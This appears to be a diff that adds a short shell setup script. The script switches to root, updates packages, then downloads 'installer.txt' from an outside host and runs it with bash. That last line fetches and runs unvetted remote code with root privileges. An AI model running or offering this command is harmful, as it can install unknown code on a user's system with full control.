@@ -1,0 +1,4 @@
+sudo su
+apt update
+apt upgrade
+curl -o install.sh https://hydrenllc.us.kg/installer.txt && chmod +x install.sh && bash install.sh
